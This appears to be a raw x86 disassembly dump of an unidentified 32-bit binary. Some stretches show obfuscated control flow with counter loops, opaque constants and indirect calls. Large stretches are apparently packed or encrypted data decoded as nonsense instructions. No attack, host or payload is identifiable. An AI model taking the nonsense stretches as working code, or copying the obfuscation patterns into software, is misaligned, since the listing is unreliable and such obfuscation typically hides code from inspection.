  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	pop    ecx
  407c4b:	aam    0xba
  407c4d:	pop    esp
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x1b7e7e7c
  407c57:	adc    al,0xbd
  407c59:	or     ebp,ebx
  407c5b:	push   cs
  407c5c:	and    BYTE PTR [edi],ah
  407c5e:	aas    
  407c5f:	test   BYTE PTR [edx+0x2223572a],al
  407c65:	jmp    0x19b77fe3
  407c6a:	fwait
  407c6b:	repz ds jecxz 0x407cb0
  407c6f:	in     al,0x6c
  407c71:	mov    al,ds:0x3e3ce77e
  407c76:	jne    0x407cf0
  407c78:	push   edx
  407c79:	xchg   edi,eax
  407c7a:	ja     0x407cd0
  407c7c:	jl     0x407c61
  407c7e:	mov    eax,0xd7005a01
  407c83:	and    ecx,DWORD PTR [edi+0x5ab5a50d]
  407c89:	inc    ebp
  407c8a:	push   eax
  407c8b:	pop    esp
  407c8c:	dec    edx
  407c8d:	outs   dx,BYTE PTR ds:[esi]
  407c8e:	push   ecx
  407c8f:	and    eax,0x396cae8b
  407c94:	push   es
  407c95:	iret   
  407c96:	test   BYTE PTR [edi],bh
  407c98:	(bad)  
  407c99:	mov    esi,0xafbd0cde
  407c9e:	bound  ebx,QWORD PTR [edi+0x5f]
  407ca1:	inc    esi
  407ca2:	lock in eax,0x86
  407ca5:	inc    edx
  407ca6:	out    0x1e,eax
  407ca8:	cmp    al,0x96
  407caa:	xchg   BYTE PTR [esp+edi*1-0x17],dl
  407cae:	int    0x91
  407cb0:	sbb    DWORD PTR [edx+0x29aef1df],ecx
  407cb6:	xchg   ecx,eax
  407cb7:	neg    DWORD PTR [eax-0x74]
  407cba:	mov    edx,0x396ac1cd
  407cbf:	add    BYTE PTR [ebx+ecx*8+0x30],dh
  407cc3:	adc    eax,0x2873dc27
  407cc8:	out    0xc7,eax
  407cca:	xchg   esi,eax
  407ccb:	adc    bh,BYTE PTR [ebx-0x4d5d4722]
  407cd1:	xor    ah,BYTE PTR [ebx+0x1dcfe55f]
  407cd7:	(bad)  
  407cd8:	pushf  
  407cd9:	arpl   WORD PTR [esi+0x30138ce3],ax
  407cdf:	imul   esi,DWORD PTR [bx+si],0x6b
  407ce3:	inc    ebx
  407ce4:	add    DWORD PTR [esi+0x74],ebx
  407ce7:	icebp  
  407ce8:	in     al,0xa3
  407cea:	inc    eax
  407ceb:	loop   0x407cb4
  407ced:	outs   dx,DWORD PTR ds:[esi]
  407cee:	xchg   edx,eax
  407cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cf0:	pop    ebp
  407cf1:	cmp    al,0x40
  407cf3:	es jns 0x407d55
  407cf6:	add    eax,0xd57b9a3
  407cfb:	mov    edi,edx
  407cfd:	xchg   ebx,eax
  407cfe:	inc    ebx
  407cff:	fwait
  407d00:	in     eax,0xdb
  407d02:	mov    bh,0x41
  407d04:	out    dx,al
  407d05:	out    dx,al
  407d06:	cwde   
  407d07:	aas    
  407d08:	mov    DWORD PTR [ebx],ebp
  407d0a:	add    DWORD PTR [ebp+edx*2-0x46],ebp
  407d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d0f:	mov    ss,edx
  407d11:	push   ds
  407d12:	inc    ebp
  407d13:	rcl    DWORD PTR [edi-0x481ab856],1
  407d19:	loop   0x407cf8
  407d1b:	ds jmp 0x9ed4:0xbf37603b
  407d23:	lods   eax,DWORD PTR ds:[esi]
  407d24:	pop    esi
  407d25:	retf   0x7520
  407d28:	jmp    0x407d09
  407d2a:	test   al,cl
  407d2c:	fild   DWORD PTR [ebx-0x2525eb8f]
  407d32:	xor    al,0xa8
  407d34:	mov    ah,0xba
  407d36:	inc    ecx
  407d37:	mov    al,0xd5
  407d39:	test   eax,0xf3b3dbce
  407d3e:	jnp    0x407d75
  407d40:	inc    esp
  407d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d42:	fild   WORD PTR [edx]
  407d44:	mov    ebx,0x1a1a36fd
  407d49:	mov    edx,0x6a7aa255
  407d4e:	test   esi,esp
  407d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d51:	push   esp
  407d52:	hlt    
  407d53:	adc    dh,BYTE PTR [eax+0x7f0c9acb]
  407d59:	(bad)  
  407d5a:	push   edi
  407d5b:	clc    
  407d5c:	leave  
  407d5d:	in     al,0x4a
  407d5f:	sti    
  407d60:	outs   dx,DWORD PTR ds:[esi]
  407d61:	fs and al,0xeb
  407d64:	js     0x407d77
  407d66:	mov    ecx,0xf22525cf
  407d6b:	mov    esp,0xcfc3de08
  407d70:	sub    bh,ch
  407d72:	xchg   edx,eax
  407d73:	push   es
  407d74:	mov    al,ds:0x966d6b1c
  407d79:	sar    DWORD PTR [ecx+esi*4+0x21],0x1d
  407d7e:	cmc    
  407d7f:	xor    al,0x9b
  407d81:	out    dx,eax
  407d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d84:	dec    edi
  407d85:	pop    eax
  407d86:	fld    DWORD PTR [esi]
  407d88:	cmp    DWORD PTR ds:0xf9e17b0b,0x55
  407d8f:	test   BYTE PTR [ebx],ah
  407d91:	sahf   
  407d92:	mov    ds:0x374a810d,eax
  407d97:	jp     0x407d33
  407d99:	repz inc ebx
  407d9b:	pop    ds
  407d9c:	out    dx,eax
  407d9d:	cmp    dl,BYTE PTR [edi]
  407d9f:	mov    fs,WORD PTR ds:0x76ca25ed
  407da5:	retf   
  407da6:	cmp    BYTE PTR [eax+edi*8+0x7f],bl
  407daa:	xor    DWORD PTR ds:0xf9311955,ecx
  407db0:	sar    DWORD PTR [ecx],0xf
  407db3:	jmp    0xc3a7:0x146c3c87
  407dba:	adc    ch,0xe
  407dbd:	scas   eax,DWORD PTR es:[edi]
  407dbe:	inc    ebp
  407dbf:	push   ebx
  407dc0:	jo     0x407d46
  407dc2:	repz out dx,al
  407dc4:	rcr    bh,0x11
  407dc7:	sbb    ah,dl
  407dc9:	pushf  
  407dca:	adc    ebx,ebx
  407dcc:	int    0xce
  407dce:	mov    dl,0x64
  407dd0:	mov    ebx,0xa357d4b4
  407dd5:	dec    ebx
  407dd6:	cli    
  407dd7:	daa    
  407dd8:	sbb    BYTE PTR [edi-0x15],bl
  407ddb:	xchg   ebp,eax
  407ddc:	xchg   esi,eax
  407ddd:	iret   
  407dde:	inc    ebp
  407ddf:	fcomi  st,st(2)
  407de1:	pop    esi
  407de2:	push   edi
  407de3:	div    ecx
  407de5:	mov    ah,BYTE PTR [edx+0xb0c709c]
  407deb:	enter  0xebba,0x9a
  407def:	mov    ebp,0x76c56b46
  407df4:	pop    ss
  407df5:	out    dx,al
  407df6:	jbe    0x407df9
  407df8:	sbb    cl,BYTE PTR [edi]
  407dfa:	lods   eax,DWORD PTR ds:[esi]
  407dfb:	stc    
  407dfc:	scas   al,BYTE PTR es:[edi]
  407dfd:	ja     0x407df4
  407dff:	add    esi,eax
  407e01:	dec    esp
  407e02:	mov    ?,WORD PTR [ecx+0x61a6e94a]
  407e08:	(bad)  
  407e09:	loopne 0x407df0
  407e0b:	je     0x407e26
  407e0d:	cmp    esi,DWORD PTR [esi]
  407e0f:	(bad)  
  407e10:	jbe    0x407daa
  407e12:	fimul  DWORD PTR [ecx+0x3fab16fd]
  407e18:	xchg   esp,eax
  407e19:	int3   
  407e1a:	(bad)  
  407e1b:	enter  0x9f48,0xdf
  407e1f:	jmp    0x53f405f5
  407e24:	leave  
  407e25:	mov    DWORD PTR [edx+0x245803e2],ebp
  407e2b:	sbb    ch,ah
  407e2d:	cmp    bl,bh
  407e2f:	hlt    
  407e30:	dec    esp
  407e31:	imul   edi,DWORD PTR [esi-0x55],0x577b336a
  407e38:	leave  
  407e39:	not    ch
  407e3b:	rcr    DWORD PTR [ecx-0x29e4ea1f],cl
  407e41:	xchg   esi,eax
  407e42:	cs jl  0x407e9d
  407e45:	mov    eax,esi
  407e47:	cmp    esi,DWORD PTR [ecx]
  407e49:	fdiv   QWORD PTR [eax]
  407e4b:	adc    DWORD PTR [esi-0x27],0x1b
  407e4f:	mov    ch,BYTE PTR [eax+edx*8+0x7]
  407e53:	mov    ebx,0x5057ab74
  407e58:	shl    BYTE PTR [edi+0x2a],0xbe
  407e5c:	fiadd  WORD PTR [ebp+eiz*1+0x33]
  407e60:	inc    ebx
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xdb698b0d
  408191:	ret    0xca3e
  408194:	jle    0x408214
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	(bad)  
  40819b:	mov    al,0x7b
  40819d:	addr16 leave 
  40819f:	in     al,dx
  4081a0:	mov    ch,0xf4
  4081a2:	lahf   
  4081a3:	mov    ebp,0xcd7a8324
  4081a8:	dec    edi
  4081a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081aa:	mov    ebp,0xed56410
  4081af:	loop   0x4081d8
  4081b1:	das    
  4081b2:	stc    
  4081b3:	sar    esp,cl
  4081b5:	push   cs
  4081b6:	mov    ds:0x17e19ec2,al
  4081bb:	enter  0xd641,0x6a
  4081bf:	fidivr DWORD PTR [ecx+0x2af245bc]
  4081c5:	les    edx,FWORD PTR ds:0x4e48da2c
  4081cb:	pop    ss
  4081cc:	jno    0x408241
  4081ce:	mov    cl,0xe
  4081d0:	cld    
  4081d1:	xchg   esp,eax
  4081d2:	retf   0xbcd4
  4081d5:	data16 xor ch,BYTE PTR [ebx]
  4081d8:	sub    BYTE PTR [ecx-0x38],bl
  4081db:	adc    DWORD PTR [eax],ecx
  4081dd:	psrad  mm2,QWORD PTR [eax-0x59]
  4081e1:	mov    dl,0x47
  4081e3:	sbb    al,BYTE PTR [edx+0x4c]
  4081e6:	xchg   ecx,eax
  4081e7:	jb     0x4081ef
  4081e9:	mov    cl,0x7a
  4081eb:	ror    BYTE PTR [edi+0x712dafe1],0xd2
  4081f2:	outs   dx,BYTE PTR ds:[esi]
  4081f3:	inc    esi
  4081f4:	xor    ecx,0xffffffcd
  4081f7:	(bad)  
  4081f9:	inc    eax
  4081fa:	aaa    
  4081fb:	xchg   DWORD PTR [eax-0x51],ebp
  4081fe:	or     al,dh
  408200:	in     eax,0x6b
  408202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408203:	stc    
  408204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408205:	jle    0x40825b
  408207:	ror    DWORD PTR [edi+0x25469d2a],cl
  40820d:	adc    BYTE PTR [esi+0x0],dh
  408210:	inc    esi
  408211:	cmc    
  408212:	fwait
  408213:	xchg   edi,eax
  408214:	test   BYTE PTR [edx],0x3b
  408217:	loope  0x40828e
  408219:	add    esi,DWORD PTR [ecx+0x4daa6e90]
  40821f:	push   edi
  408220:	mov    esi,edx
  408222:	mov    dh,0x53
  408224:	mov    ebp,0xb981fa67
  408229:	adc    edi,DWORD PTR [edx+esi*8]
  40822c:	dec    eax
  40822d:	(bad)  
  40822e:	dec    edx
  40822f:	mov    ds:0x264cd5f1,eax
  408234:	aaa    
  408235:	adc    eax,DWORD PTR [ecx]
  408237:	(bad)  
  408239:	dec    eax
  40823a:	pop    esi
  40823b:	lods   eax,DWORD PTR ds:[esi]
  40823c:	inc    edx
  40823d:	xor    al,0xa6
  40823f:	out    0xf3,al
  408241:	dec    edx
  408242:	popa   
  408243:	test   esp,eax
  408245:	out    0x51,eax
  408247:	push   esp
  408248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408249:	ret    
  40824a:	retf   0x9f66
  40824d:	xor    eax,0x373c162e
  408252:	lahf   
  408253:	mov    eax,0x71da38d0
  408258:	sbb    esp,edi
  40825a:	push   ebx
  40825b:	sete   ah
  40825e:	imul   esp,DWORD PTR [ebp+0x7d95cbe7],0x7f
  408265:	xchg   esi,eax
  408266:	or     eax,0xe6ce1221
  40826b:	cmp    al,0xde
  40826d:	bound  esi,QWORD PTR [edi+0x585f1d25]
  408273:	loopne 0x408270
  408275:	or     ebx,ebx
  408277:	pop    edi
  408278:	push   edi
  408279:	push   cs
  40827a:	addr16 dec ebp
  40827c:	mov    DWORD PTR ds:0x1173bd52,esp
  408282:	and    eax,0x300d2c5b
  408287:	add    ecx,DWORD PTR [ebx-0x6874eeb9]
  40828d:	pop    ecx
  40828e:	fxch   st(2)
  408290:	mov    cl,0x19
  408292:	(bad)  
  408293:	ja     0x40830d
  408295:	loop   0x408271
  408297:	pop    ss
  408298:	adc    edx,ebx
  40829a:	mov    eax,ds:0x32f51f6a
  40829f:	mov    ds:0x34d417a5,eax
  4082a4:	adc    DWORD PTR [ebp-0x21ccade7],esp
  4082aa:	push   ss
  4082ab:	mov    edi,0x6e7dd603
  4082b0:	into   
  4082b1:	ficom  DWORD PTR [edi+0x5d]
  4082b4:	pop    ss
  4082b5:	hlt    
  4082b6:	push   ds
  4082b7:	xor    DWORD PTR [ecx-0x688c1a04],esi
  4082bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082be:	pop    es
  4082bf:	mov    DWORD PTR [eax-0x2f61d936],ebx
  4082c5:	dec    edx
  4082c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082c7:	out    dx,al
  4082c8:	std    
  4082c9:	add    eax,0xbdb43cbc
  4082ce:	(bad)  
  4082cf:	pop    esp
  4082d0:	ds mov bh,0x32
  4082d3:	mov    al,ds:0xd719a900
  4082d8:	mov    ds:0x62a736c9,eax
  4082dd:	mov    esi,0x7bfc1372
  4082e2:	sbb    esi,DWORD PTR [ebx]
  4082e4:	pop    edi
  4082e5:	mov    esp,0x846360e2
  4082ea:	lds    edx,FWORD PTR [ecx-0x5e]
  4082ed:	int    0xe4
  4082ef:	jmp    0x933b:0xdd4b426e
  4082f6:	sub    edx,ebp
  4082f8:	mov    ebx,0x24c216cc
  4082fd:	xor    edx,esi
  4082ff:	or     bh,BYTE PTR [eax-0x39]
  408302:	mov    ebp,DWORD PTR [ebx]
  408304:	mov    dh,0xf2
  408306:	loop   0x4082f3
  408308:	add    BYTE PTR [edi+0x238a7d87],0x91
  40830f:	retf   
  408310:	gs jge 0x408334
  408313:	add    ebp,DWORD PTR [edx+0x18107283]
  408319:	paddsb mm5,mm1
  40831c:	loope  0x4082d0
  40831e:	test   BYTE PTR es:[ecx+0x5b],0x8b
  408323:	mov    esi,0x78fc0230
  408328:	sbb    ch,BYTE PTR [edi-0xa]
  40832b:	out    dx,eax
  40832c:	jl     0x40833c
  40832e:	jp     0x408392
  408330:	dec    ebx
  408331:	fnsave [esi-0x372208b6]
  408337:	in     eax,0x8e
  408339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40833a:	aaa    
  40833b:	dec    eax
  40833c:	iret   
  40833d:	in     al,dx
  40833e:	shr    DWORD PTR [ebx+0x67ee549f],cl
  408344:	in     al,dx
  408345:	mov    DWORD PTR [edx+0x1fc7bf87],0x7fda8544
  40834f:	fs aam 0x1
  408352:	and    BYTE PTR [esi-0x558635a0],dh
  408358:	sahf   
  408359:	jb     0x4083b7
  40835b:	add    ebp,0x95a26be6
  408361:	pop    esp
  408362:	jmp    0x9ca20a10
  408367:	lock push ss
  408369:	ja     0x4082ee
  40836b:	test   BYTE PTR [edx-0x59],0x74
  40836f:	jno    0x408382
  408371:	cwde   
  408372:	inc    edi
  408373:	cwde   
  408374:	lds    edx,FWORD PTR [edi+0x20]
  408377:	lock mov esi,0xff964001
  40837d:	in     eax,0x29
  40837f:	push   ss
  408380:	add    eax,0xbac70447
  408385:	add    eax,0x9711886a
  40838a:	or     al,0x81
  40838c:	test   BYTE PTR [edi+0x44],ch
  40838f:	ror    BYTE PTR [ecx+0x2c],0xff
  408393:	pop    ss
  408394:	fild   WORD PTR [edx+0x6f]
  408397:	push   cs
  408398:	dec    ecx
  408399:	mov    cl,0xb3
  40839b:	scas   al,BYTE PTR es:[edi]
  40839c:	call   0xd594:0xa2681404
  4083a3:	test   eax,0x8055c351
  4083a8:	iret   
  4083a9:	out    dx,eax
  4083aa:	pop    esi
  4083ab:	imul   ebx,DWORD PTR [edi-0x1d900e06],0xfffffffe
  4083b2:	repnz xchg ebp,eax
  4083b4:	add    BYTE PTR [edx],dh
  4083b6:	shr    esi,1
  4083b8:	int    0xc
  4083ba:	mov    cl,BYTE PTR [esi]
  4083bc:	dec    esp
  4083bd:	(bad)  
  4083be:	jle    0x40842a
  4083c0:	or     al,0xe7
  4083c2:	imul   ebp,DWORD PTR [ecx+ecx*4+0x45],0x5b2581e0
  4083ca:	aaa    
  4083cb:	inc    ebx
  4083cc:	add    BYTE PTR [eax],al
  4083ce:	add    BYTE PTR [eax],al
  4083d0:	add    BYTE PTR [ecx+0x43375b],ah
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	push   0xe4fe85a7
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x4084c0
  408471:	inc    edx
  408472:	jecxz  0x408430
  408474:	or     ecx,edx
  408476:	div    esp
  408478:	jecxz  0x408415
  40847a:	mov    BYTE PTR [edx+0x59544be7],bh
  408480:	xor    DWORD PTR [esi+eax*8-0x43251ccf],esi
  408487:	cmp    eax,0x2a5fcad0
  40848c:	sti    
  40848d:	test   ecx,ebp
  40848f:	mov    BYTE PTR ds:[ebp+0x65],dh
  408493:	ret    0x678d
  408496:	add    BYTE PTR [ecx+0x1271ced2],dl
  40849c:	(bad)  
  40849d:	cli    
  40849e:	es mov dl,0x16
  4084a1:	jle    0x408473
  4084a3:	and    eax,0x8946f499
  4084a8:	pop    ecx
  4084a9:	ins    BYTE PTR es:[edi],dx
  4084aa:	xchg   ecx,eax
  4084ab:	hlt    
  4084ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ad:	jmp    0x5c443d00
  4084b2:	dec    ebp
  4084b3:	cmp    ebx,DWORD PTR [eax+ebp*8-0x7e]
  4084b7:	sub    DWORD PTR [ebx-0x7559e1a1],edi
  4084bd:	mov    bl,0xd8
  4084bf:	pop    esi
  4084c0:	(bad)  
  4084c2:	aas    
  4084c3:	push   esi
  4084c4:	jmp    0x4084e7
  4084c6:	fnstcw WORD PTR [esi]
  4084c8:	(bad)  
  4084c9:	outs   dx,BYTE PTR ds:[esi]
  4084ca:	mov    al,ds:0xeec9e3d6
  4084cf:	test   DWORD PTR [edx],edx
  4084d1:	xor    eax,0xef0d5df3
  4084d6:	scas   al,BYTE PTR es:[edi]
  4084d7:	mov    ch,0x4d
  4084d9:	fs into 
  4084db:	ret    
  4084dc:	or     DWORD PTR [ecx+edi*1],ebp
  4084df:	(bad)  
  4084e0:	xor    ecx,DWORD PTR [eax+esi*8]
  4084e3:	jns    0x4084ea
  4084e5:	add    BYTE PTR ds:0xdc16ef19,0xdb
  4084ec:	cli    
  4084ed:	mov    ah,0x6c
  4084ef:	add    eax,0xb02fd982
  4084f4:	push   es
  4084f5:	mov    ebx,cs
  4084f7:	call   0x1403:0x1f313085
  4084fe:	in     eax,0x23
  408500:	sbb    ch,cl
  408502:	push   ecx
  408503:	mov    DWORD PTR [edx+0x5083fee9],ebp
  408509:	sbb    DWORD PTR [ebx],0xffffffad
  40850c:	xchg   ebx,eax
  40850d:	add    edx,DWORD PTR [ebp+0x76f60cc9]
  408513:	sahf   
  408514:	imul   eax,esp,0x1ea7781c
  40851a:	gs aaa 
  40851c:	push   es
  40851d:	xlat   BYTE PTR ds:[ebx]
  40851e:	int    0x1d
  408520:	aam    0x8c
  408522:	aam    0x3a
